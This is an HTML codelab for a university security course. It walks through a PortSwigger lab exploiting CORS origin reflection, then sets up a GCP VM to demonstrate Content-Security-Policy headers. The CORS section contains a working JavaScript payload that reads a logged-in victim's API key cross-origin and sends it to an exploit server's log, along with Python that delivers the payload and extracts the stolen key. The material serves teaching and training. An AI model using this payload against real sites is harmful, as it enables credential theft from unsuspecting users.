@@ -1,0 +1,273 @@
+
+<!doctype html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1,user-scalable=yes">
+<meta name="theme-color" content="#4F7DC9">
+<meta charset="UTF-8">
+<title>4.2: CORS, Content Security Policy</title>
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Source+Code+Pro:400|Roboto:400,300,400italic,500,700|Roboto+Mono">
+<link rel="stylesheet" href="//fonts.googleapis.com/icon?family=Material+Icons">
+<link rel="stylesheet" href="https://storage.googleapis.com/claat-public/codelab-elements.css">
+<style>
+.success{color:#1e8e3e}.error{color:red} </style>
+</head>
+<body>
+<google-codelab-analytics gaid="UA-49880327-14"></google-codelab-analytics>
+<google-codelab codelab-gaid="" id="W4.2_cors_csp" title="4.2: CORS, Content Security Policy" environment="web" feedback-link="https://docs.google.com/document/d/1G6FDoaQkasvJavHgXG8BwQGgB5P_YwL6QX_Vu5Bi8cI">
+<google-codelab-step label="cors (1)" duration="10">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack" target="_blank">basic-origin-reflection-attack</a> </h2>
+<p>CORS is a way to control API access across domains for particular web services. Unfortunately, some developers do not wish to track all of the domains that have access to its content. To avoid having to specify these domains, they will instead allow all sites access by simply reflecting back the contents of the <code>Origin:</code> request header into the subsequent <code>Access-Control-Allow-Origin:</code> response header. If the site <code>ig.com</code> did this and its users had sensitive API keys stored on the site, this would allow <code>malicious.com</code> to be able to access a victim&#39;s API key on <code>ig.com</code> once the victim visits <code>malicious.com</code>.</p>
+<h3 is-upgraded>Demonstrate vulnerability</h3>
+<p>To demonstrate this attack, visit the level site and login with the credentials you are given (e.g. <code>wiener / peter</code>). For the exercise, a vulnerable site stores a user&#39;s sensitive API key. It has been set-up to allow cross-origin access from everywhere by reflecting the <code>Origin:</code> request header back onto the <code>Access-Control-Allow-Origin:</code> response header. The goal is to obtain a victim account&#39;s API key on the site. To do so, we host malicious content on an exploit site that the victim visits. When the victim visits the exploit site, a script on the site will pull the victim&#39;s API key from the vulnerable site and reveal it. Submitting this API key will solve the level.<br><br>Start by logging into the site. Bring up the Developer Tools console, click on the &#34;Network&#34; tab, and then click on &#34;My account&#34;.<br><br><img style="width:624px" src="img/3f8ef879e401fc78.png"><br>View the response page to see that your API key has been retrieved as part of the page access. The key has been retrieved via an embedded request. Navigate the requests shown in the Developer Tools and click on the &#34;<code>accountDetails</code>&#34; request. Examine the response headers.</p>
+<ul>
+<li><strong>Show a screenshot of the CORS header that enables credentials to be sent to get the key.</strong></li>
+</ul>
+<p>We will now send a request to the <code>accountDetails</code> API endpoint from a bogus domain to see if it is allowed. Consider the script below that logs in as the user, then modifies the session headers to add the <code>Origin:</code> header. Modify the script to set the header to a bogus site containing your OdinID (e.g. <a href="https://wuchang.com" target="_blank"><code>https://wuchang.com</code></a>). The script then attempts to access the <code>accountDetails</code> API endpoint. </p>
+<pre><code>site_url = f&#39;https://{site}&#39;
+login_url = f&#34;https://{site}/login&#34;
+login_response = s.get(login_url)
+csrf = bs4.BeautifulSoup(login_response.text,&#39;html.parser&#39;).find(&#39;input&#39;, {&#39;name&#39;:&#39;csrf&#39;})[&#39;value&#39;]
+
+login_data = {
+        &#39;csrf&#39;: csrf,
+        &#39;username&#39;: &#39;wiener&#39;,
+        &#39;password&#39;: &#39;peter&#39;
+}
+
+resp = s.post(login_url,data=login_data)
+
+s.headers.update({&#39;Origin&#39;:&#39;https://&lt;FMI&gt;.com&#39;})
+
+details_url = f&#34;https://{site}/accountDetails&#34;
+resp = s.get(details_url)
+
+# View the response headers showing the Origin is echoed
+print(resp.headers)
+
+# Get the response containing the API key
+print(resp.text)</code></pre>
+<ul>
+<li><strong>Show a screenshot of the headers in the response to see that the site simply reflects the header in </strong><strong><code>Access-Control-Allow-Origin:</code></strong><strong>.</strong></li>
+</ul>
+<p>Because the <code>Origin:</code> is echoed, the <code>accountDetails</code> page can be accessed when embedded on any page (including the exploit server that the victim will visit!)</p>
+</google-codelab-step>
+<google-codelab-step label="-" duration="5">
+<h3 is-upgraded>Develop exploit</h3>
+<p>We will now leverage the vulnerability to exploit the vulnerability in order to obtain the API key of a victim on the vulnerable site. Within the lab, login again using the credentials you are given and view your API key in &#34;My account&#34;. </p>
+<ul>
+<li><strong>Take a screenshot of the API key and include it in your lab notebook.<br></strong><img style="width:252px" src="img/3bbb0c6ae1b66713.png"></li>
+</ul>
+<p><br>Our goal is to upload a malicious payload that results in the victim accessing its API key on the vulnerable site and then exposing it. Consider the code below:</p>
+<pre><code>exploit_html = f&#39;&#39;&#39;&lt;script&gt;
+   var req = new XMLHttpRequest();
+   req.onload = reqListener;
+   req.open(&#39;get&#39;,&#39;{site_url}/accountDetails&#39;,true);
+   req.withCredentials = true;
+   req.send();
+
+   function reqListener() &#123;&#123;
+       location=&#39;/log?key=&#39;+this.responseText;
+   }};
+&lt;/script&gt;&#39;&#39;&#39;</code></pre>
+<p>When uploaded to the exploit server and previewed using our own session, it will invoke the Javascript code to access the API endpoint that contains our API key on the vulnerable site. It will then attach it as a URL parameter to an HTTP request back to the exploit server via the path &#39;<code>/log?key=</code>&#39;. A properly set CORS header would have blocked this request. Modify the <code>site_url</code> in the script to match your vulnerable site and then <code>STORE</code> the above HTML into the exploit server.</p>
+<p>Then, visit the exploit server and click on &#34;<code>View exploit</code>&#34;. As the exploit shows, the location of the browser will be set in a way that reveals the results of the request.</p>
+<ul>
+<li><strong>Take a screenshot of the API key as it appears in the browser window.</strong></li>
+</ul>
+<p class="image-container"><img style="width:624px" src="img/c3ce50afe53e1bff.png"></p>
+<p>Next, click on &#34;<code>Access log</code>&#34; within the exploit server to show that your API key has appeared.</p>
+<p class="image-container"><img style="width:624px" src="img/1990800d861770e0.png"></p>
+</google-codelab-step>
+<google-codelab-step label="-" duration="5">
+<h3 is-upgraded>Deliver exploit</h3>
+<p>Deliver the exploit to the victim either programmatically or via the web interface. This will cause an emulated victim to click on your payload while logged into the vulnerable site. After doing so, re-visit the &#34;Access log&#34; to view the victim&#39;s URL-encoded API key. Note that the victim&#39;s request comes in from a local IP address and uses the username of <code>administrator</code>:</p>
+<p class="image-container"><img style="width:624px" src="img/53e59001174199d7.png"></p>
+<p>Copy the API key (enclosed in the URL-encoded double-quotes <code>%22</code>), click on &#34;Submit solution&#34;, and then paste it to solve the level.</p>
+<p>Programmatically, this can be done via Python. The snippet below, delivers the exploit to the victim.</p>
+<pre><code>formData = {
+    &#39;urlIsHttps&#39;: &#39;on&#39;,
+    &#39;responseFile&#39;: &#39;/exploit&#39;,
+    &#39;responseHead&#39;: &#39;HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8&#39;,
+    &#39;responseBody&#39;: exploit_html,
+    &#39;formAction&#39;: &#39;DELIVER_TO_VICTIM&#39;
+}
+resp = s.post(exploit_url, data=formData)</code></pre>
+<p>Then, the code below pulls the log entries from the exploit server and searches for accesses from the victim (<code>administrator</code>). It then prints the first one.</p>
+<pre><code>log_url = f&#39;{exploit_url}/log&#39;
+resp = s.get(log_url)
+soup = BeautifulSoup(resp.text,&#39;html.parser&#39;)
+pretext = soup.find(&#39;pre&#39;).text.split(&#39;\n&#39;)
+admin_entries = [line for line in pretext if &#39;administrator&#39; in line]
+print(admin_entries[0])</code></pre>
+<p>Given this log entry, the code below then parses out the <code>administrator</code>&#39;s API key by splitting the output on the URL-encoded double-quote (<code>%22</code>). Both the resulting list and the entry containing the API key are then printed:</p>
+<pre><code>log_entries = admin_entries[0].split(&#39;%22&#39;)
+print(log_entries)
+print(log_entries[11])</code></pre>
+<p>Finally, the API key is submitted onto the original site&#39;s solution submission form.</p>
+<pre><code>submit_url = f&#39;https://{site}/submitSolution&#39;
+solution_data = {
+  &#39;answer&#39; : {log_entries[11]}
+}
+s.post(submit_url, data=solution_data)</code></pre>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId </strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="Content-Security-Policy VM setup" duration="10">
+<p>From the detailed guide to &#39;<a href="https://peteris.rocks/blog/exotic-http-headers" target="_blank">exotic HTTP headers</a>&#39;. We&#39;ll be running a toy web application on a virtual machine on Google Cloud Platform to demonstrate the use of the header. VMs on GCP typically have their network traffic filtered by default. For our application, we&#39;ll first need to set up some firewall rules to allow access to the ports the toy web application uses.</p>
+<h2 is-upgraded>Option #1: Web console</h2>
+<p>Visit your Google Cloud Platform project and select &#34;<code>VPC network</code>&#34; and &#34;<code>Firewall</code>&#34;</p>
+<p class="image-container"><img style="width:424px" src="img/ae5be5c97fd39b59.png"></p>
+<p>Create a firewall rule named <code>csp-demo-server</code></p>
+<p class="image-container"><img style="width:452px" src="img/4078976b78764873.png"></p>
+<p>Specify a target tag named the same, then in the Ingress direction, specify that all source IP addresses (<code>0.0.0.0/0</code>) can access TCP ports 4321 and 1234.</p>
+<p class="image-container"><img style="width:214px" src="img/b6bccfa1731a8d77.png"></p>
+<p>Then, create the rule.</p>
+<p class="image-container"><img style="width:624px" src="img/de49a161a8bec006.png"></p>
+<h2 is-upgraded>Option #2: Web shell</h2>
+<p>Visit the web console and click on the Cloud Shell icon. </p>
+<p class="image-container"><img style="width:250px" src="img/75f2ab71d6d7311a.png"></p>
+<p>Then, run the following <code>gcloud</code> command for creating the rule. </p>
+<pre><code>gcloud compute firewall-rules create csp-demo-server \
+  --allow=tcp:4321,tcp:1234 --target-tags=csp-demo-server \
+  --direction=INGRESS</code></pre>
+</google-codelab-step>
+<google-codelab-step label="-" duration="10">
+<p>Next, create a new Compute Engine VM instance.</p>
+<h2 is-upgraded>Option #1: Web console</h2>
+<p>Visit the Compute Engine console and create a new instance named <code>csp</code>, specifying its location to be in <code>us-west1-b</code> and a recent version of Ubuntu.</p>
+<p class="image-container"><img style="width:601px" src="img/dc515b8a769aea60.png"></p>
+<p class="image-container"><img style="width:538px" src="img/653b5467bb06b494.png"></p>
+<p class="image-container"><img style="width:547px" src="img/ee014e9d4d173f.png"></p>
+<p>Then, within the Networking subsection, attach the <code>csp-demo-server</code> tag created previously. </p>
+<p class="image-container"><img style="width:549px" src="img/99ca28f4d99b373a.png"></p>
+<p>Then, <code>Create</code> the VM. Note the IP address of the instance, then click on the &#34;<code>SSH</code>&#34; button for it to bring up a session.</p>
+<p class="image-container"><img style="width:624px" src="img/25a169c7a634e59d.png"></p>
+<h2 is-upgraded>Option #2: Cloud Shell</h2>
+<p>One can also launch the VM via <code>gcloud</code> with the appropriate flags set as below:</p>
+<pre><code>gcloud compute instances create csp \
+  --image-family=ubuntu-2004-lts \
+  --image-project=ubuntu-os-cloud \
+  --zone=us-west1-b \
+  --machine-type=e2-micro \
+  --tags=csp-demo-server</code></pre>
+<p>Then, after it comes fully up, you can <code>ssh</code> into it via:</p>
+<pre><code>gcloud compute ssh csp</code></pre>
+<h2 is-upgraded><strong>Note</strong></h2>
+<aside class="warning"><p>If you experience a resource error attempting to bring up the VM, select alternate availability zones in <code>us-west1</code> for the VM</p>
+</aside>
+</google-codelab-step>
+<google-codelab-step label="-" duration="10">
+<h2 is-upgraded>Install NodeJS and npm</h2>
+<p>Within the SSH terminal, run the following commands to install NodeJS and npm (the package manager for Node.JS).</p>
+<pre>sudo apt update -y
+sudo apt install nodejs npm git -y</pre>
+<h2 is-upgraded>Download and setup the NodeJS server code</h2>
+<p>Clone the repository with the code and install its packages. </p>
+<pre>git clone https://github.com/wu4f/cs495-src
+cd cs495-src/xss-csp
+npm install</pre>
+<p>The NodeJS server for testing HTTP&#39;s Content-Security-Policy (CSP) header is in <code>csp_server.js</code>. We will bring up a debug version of the server on ports <code>4321</code> and <code>1234.</code> Setting the <code>DEBUG</code> environment variable to <code>express:router</code> allows us to see the URL routes our server is handling. Run the following to bring the server up locally (e.g. <code>localhost</code>) at ports <code>1234</code> and <code>4321</code>. </p>
+<pre>DEBUG=express:router nodejs csp_server.js</pre>
+<p>Note that to terminate the server, use <code>Ctrl+c</code>. </p>
+<h2 is-upgraded>Visit the server at port 4321</h2>
+<p>After running the server, go to a web browser and point it to <code>http://external_IP_address:4321</code> to view the landing page.</p>
+<p class="image-container"><img style="width:404px" src="img/a42bf19c5eb8ff13.png"></p>
+</google-codelab-step>
+<google-codelab-step label="Content-Security-Policy code" duration="10">
+<h2 is-upgraded>Examine NodeJS server</h2>
+<p>The source code for the server we will use to look at how CSP works is below. As the outer code snippet of the server shows, node will bring up two identical servers on localhost: one on port 1234 and one on port 4321.</p>
+<pre><code>&#34;use strict&#34;
+var request = require(&#39;request&#39;)
+var express = require(&#39;express&#39;)
+
+for (let port of [1234, 4321]) {
+  var app = express()
+  app.use(&#39;/script.js&#39;...
+  ...
+  app.use((req, res) =&gt; ...
+  ...
+  app.listen(port)
+}</code></pre>
+<p>Within the main code block, the server first registers a &#39;<code>/script.js</code>&#39; route that sends a Javascript command to update a particular element by its ID (<code>req.query.id</code>). If the script is allowed to run on the caller, the HTML of the element is changed with a message that notifies the user the script changed it. The URL is then logged onto the NodeJS console.</p>
+<pre><code>  app.use(&#39;/script.js&#39;, (req, res) =&gt; {
+    res.send(`document.querySelector(&#39;#${req.query.id}&#39;).innerHTML = &#39;changed by ${req.query.id} script&#39;`)
+    console.log(req.url)
+  })</code></pre>
+<p>The second route handles all other requests.</p>
+<ul>
+<li>It pulls a request field labeled <code>csp</code> from the URL and uses it to set the <code>Content-Security-Policy</code> HTTP response header on the response to the request.</li>
+<li>It then sends the HTML for the page. If the URL request contains a request parameter named <code>'user'</code>, NodeJS fills in the <code>h1</code> header greeting with its value, otherwise it prints <code>'anonymous'</code>.</li>
+<li>This is followed by 3 <code>p</code> tags each with its own <code>id</code>: <code>inline</code>, <code>local</code>, and <code>remote.</code> Each tag starts out with the text <code>'is this going to be changed by..script?</code>&#39;</li>
+<li>This is followed by 3 <code>script</code> tags. Each script tag attempts to invoke the exact same Javascript code to change the text of the <code>p</code> tag it is associated with.</li>
+<li>The first one attempts to modify the &lt;<code>p id="inline"</code>&gt; element via an in-line Javascript call</li>
+<li>The second one attempts to modify the &lt;<code>p id="origin"</code>&gt; element via a script downloaded from the same-origin (&#39;<code>/script.js</code>&#39;)</li>
+<li>The third one attempts to modify the &lt;<code>p id="remote"</code>&gt; element via a script downloaded from a different origin: (&#39;<a href="http://hostname:1234/script.js?id=remote" target="_blank"><code>http://${req.hostname}:1234/script.js?id=remote</code></a>&#39;). Note that this assumes that the original page is served from the server running on port 4321.</li>
+</ul>
+<pre><code>  app.use((req, res) =&gt; {
+    var csp = req.query.csp
+    if (csp) res.header(&#39;Content-Security-Policy&#39;, csp)
+    res.send(`
+      &lt;html&gt;
+      &lt;body&gt;
+        &lt;h1&gt;Hello, ${req.query.user || &#39;anonymous&#39;}&lt;/h1&gt;
+        &lt;p id=&#34;inline&#34;&gt;is this going to be changed by inline script?&lt;/p&gt;
+        &lt;p id=&#34;origin&#34;&gt;is this going to be changed by origin script?&lt;/p&gt;
+        &lt;p id=&#34;remote&#34;&gt;is this going to be changed by remote script?&lt;/p&gt;
+        &lt;script&gt;document.querySelector(&#39;#inline&#39;).innerHTML = &#39;changed by inline script&#39;&lt;/script&gt;
+        &lt;script src=&#34;/script.js?id=origin&#34;&gt;&lt;/script&gt;
+        &lt;script src=&#34;http://${req.hostname}:1234/script.js?id=remote&#34;&gt;&lt;/script&gt;
+      &lt;/body&gt;
+      &lt;/html&gt;
+      `)
+    console.log(req.url)
+  })</code></pre>
+</google-codelab-step>
+<google-codelab-step label="Content-Security-Policy examples" duration="10">
+<p>For the exercises below, substitute your username for <code>'OdinID'</code> in links below.</p>
+<h2 is-upgraded>Example #1</h2>
+<p>Start by generating the page that allows all three scripts to change base HTML. The request only contains the <code>'user'</code> request parameter, but not the <code>'csp'</code> parameter. As a result, no <code>Content-Security-Policy</code> header is returned by the server and all 3 scripts will run and modify their respective <code>p</code> elements:</p>
+<p><code>http://IP_address:4321/?user=OdinID</code> </p>
+<ul>
+<li><strong>Take a screenshot of the page result that includes the URL in the browser</strong></li>
+</ul>
+<h2 is-upgraded>Example #2</h2>
+<p>Now, open up the Developer Tools and go to the Console. We will now set the policy via the <code>csp</code> parameter to be the most restrictive (i.e. <code>default-src 'none'</code>).</p>
+<p><code>http://IP_address:4321/?user=OdinID&csp=default-src 'none'</code></p>
+<ul>
+<li><strong>Find the Content-Security-Policy: response header in the original request and take a screenshot showing it has been set properly</strong></li>
+<li><strong>Take a screenshot of the console output showing all scripts blocked</strong></li>
+<li><strong>Take a screenshot of the page result that includes the URL in the browser</strong></li>
+</ul>
+<h2 is-upgraded>Example #3</h2>
+<p>We will now set the policy via the <code>csp</code> parameter to allow scripts from <code>'self'</code>. (i.e. <code>default-src 'self'</code>). <code>http://IP_address:4321/?user=OdinID&csp=default-src 'self'</code></p>
+<ul>
+<li><strong>Take a screenshot of the console output showing the scripts that have been blocked. Explain why these results differ from the previous example.</strong></li>
+<li><strong>Take a screenshot of the page result that includes the URL in the browser</strong></li>
+</ul>
+<h2 is-upgraded>Example #4</h2>
+<p>Finally, we will augment the policy again to allow additional script options. <code>http://IP_address:4321/?user=OdinID&csp=default-src 'self'; script-src 'self' 'unsafe-inline'</code></p>
+<ul>
+<li><strong>Take a screenshot of the console output showing the scripts that have been blocked. Explain why these results differ from the previous example based on the additional options given.</strong></li>
+<li><strong>Take a screenshot of the page result that includes the URL in the browser</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="Clean up" duration="2">
+<h2 is-upgraded>Option #1: Web console</h2>
+<p>Visit the Compute Engine and VPC network consoles and delete the VM and firewall rule.</p>
+<p class="image-container"><img style="width:624px" src="img/290b10f655501955.png"></p>
+<h2 is-upgraded>Option #2: Cloud Shell</h2>
+<p>Run the gcloud commands below to delete the VM and firewall rule.</p>
+<pre><code>gcloud compute instances delete csp --zone=us-west1-b
+
+gcloud compute firewall-rules delete csp-demo-server</code></pre>
+</google-codelab-step>
+</google-codelab>
+<script src="https://storage.googleapis.com/claat-public/native-shim.js"></script>
+<script src="https://storage.googleapis.com/claat-public/custom-elements.min.js"></script>
+<script src="https://storage.googleapis.com/claat-public/prettify.js"></script>
+<script src="https://storage.googleapis.com/claat-public/codelab-elements.js"></script>
+<script src="//support.google.com/inapp/api.js"></script>
+</body>
+</html>
